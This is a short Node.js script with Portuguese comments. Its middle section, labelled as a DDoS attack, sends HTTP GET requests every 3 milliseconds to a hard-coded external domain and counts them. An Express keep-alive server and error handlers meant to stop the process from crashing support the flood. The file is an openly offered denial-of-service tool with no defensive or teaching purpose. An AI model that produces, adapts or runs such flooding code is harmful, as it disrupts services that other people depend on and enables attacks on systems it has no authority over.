//db
const { JsonDatabase} = require("kirito.db")
const db = new JsonDatabase({ databasePath: "./db.json" })
const KiritoDB = require("kirito.db.remote")
const db2 = new KiritoDB()
const url = "https://api.kirito.redire.online"

//axios
const axios = require("axios")

//express
const express = require("express")
const app = express()
const expre_port = "2003"

app.get('/', async (req, res) => {
   res.status(200).json({
       status: "ok"
    })
})

app.listen(expre_port, () => {
  console.log(`servidor web on na porta: ${expre_port}`)
})


////// Ataque DDOS inicio ///////////

//function
function main() {
db.add(`requets.${url}`, 1)

axios.get(`${url}`).then(response => {

console.log(`requisição: ${db.get(`requets.${url}`)}`)

})

}

//inicia o loop
setInterval(main, 3)

/////// Ataque DDOS fim /////////


//anti off
process.on('unhandRejection', (reason, promise) => {
 console.log(`❗ | [Erro]\n\n` + reason.message, promise);
});

process.on('uncaughtException', (error, origin) => {
  console.log(`❗ | [Erro]\n\n` + error, origin);
});

process.on('uncaughtExceptionMonitor', (error, origin) => {
 console.log(`❗ | [Erro]\n\n` + error, origin);
});
